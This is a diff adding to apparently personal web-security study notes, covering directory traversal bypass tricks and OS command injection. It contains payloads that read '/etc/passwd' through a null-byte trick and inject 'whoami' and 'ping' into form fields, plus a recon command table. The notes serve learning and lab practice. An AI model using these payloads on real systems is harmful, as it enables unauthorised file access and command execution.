@@ -39,3 +39,31 @@ SUBSTRING(string_expression, start, length)
 intruder in burp
 https://sandunigfdo.medium.com/blind-sql-injection-with-conditional-responses-d23ff6660299
 ```
+## 12-11-2034
+### directory traversal
+```
+url encoding
+double url encoding
+....// so after one strip we get ../
+if check happens whether it starts with given dir then use that dir then traverse back
+if chekc happens whether file ends with given extension use null byte
+
+a null byte to effectively terminate the file path before the required extension. For example:
+
+filename=../../../etc/passwd%00.png
+var/www/img
+```
+### os command injection
+```
+Purpose of command	Linux	Windows
+Name of current user	whoami	whoami
+Operating system	uname -a	ver
+Network configuration	ifconfig	ipconfig /all
+Network connections	netstat -an	netstat -an
+Running processes	ps -ef	tasklist
+
+->
+productId=3 | whoami &storeId=1
+
+email=x||ping+-c+10+127.0.0.1||
+```
